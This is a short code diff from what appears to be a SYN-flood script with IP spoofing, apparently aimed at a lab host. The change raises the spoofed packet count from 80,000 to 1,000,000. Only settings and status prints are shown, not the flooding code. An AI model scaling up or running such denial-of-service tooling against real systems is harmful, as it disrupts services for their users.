@@ -8,7 +8,7 @@ TARGET_IP = "192.168.56.103"
 TARGET_PORT = 80
 
 # Number of spoofed SYN packets to send
-PACKET_COUNT = 80000
+PACKET_COUNT = 1000000
 
 print(f"[+] Starting TCP SYN Flood with IP Spoofing on {TARGET_IP}:{TARGET_PORT}")
 print(f"[+] Sending {PACKET_COUNT} spoofed SYN packets...\n")
